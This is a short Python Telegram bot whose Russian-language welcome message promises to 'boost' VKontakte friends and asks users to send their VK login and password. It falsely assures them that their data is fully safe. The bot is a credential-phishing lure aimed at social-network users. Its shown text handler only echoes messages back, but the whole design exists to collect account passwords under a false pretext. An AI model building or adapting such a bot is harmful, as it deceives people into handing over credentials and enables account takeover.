import telebot
import time
from config import bot_token


bot = telebot.TeleBot(bot_token)

# my_id = 1107191282

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    img = open('hello.jpg', 'rb')
    bot.send_photo(message.chat.id, img)  # отправляем приветсвенную картинку

    info = """Накручу друзей для тебя ❤️
                Отправь логин и пароль от страницы вконтакте, через пробел, нажми ENTER и жди заявки в друзья!😉
                
                Все ваши данные в полной безопасности. Если есть сомнения привяжите свой телефон,
                 чтобы сбросить пароль в любое время"""
    bot.send_message(message.chat.id, info)

@bot.message_handler(content_types=['text'])
def main(message):
    bot.send_message(message.chat.id, message.text)



while True:
    print('Накручиваю v.0.1')

    try:
        bot.polling(none_stop=True, interval=3, timeout=20)
        print('Этого не должно быть')
        # bot.infinity_polling(True)
    except telebot.apihelper.ApiException:
        print('Проверьте связь и API')
        time.sleep(1)
    except Exception as e:
        print(e)
        time.sleep(1)
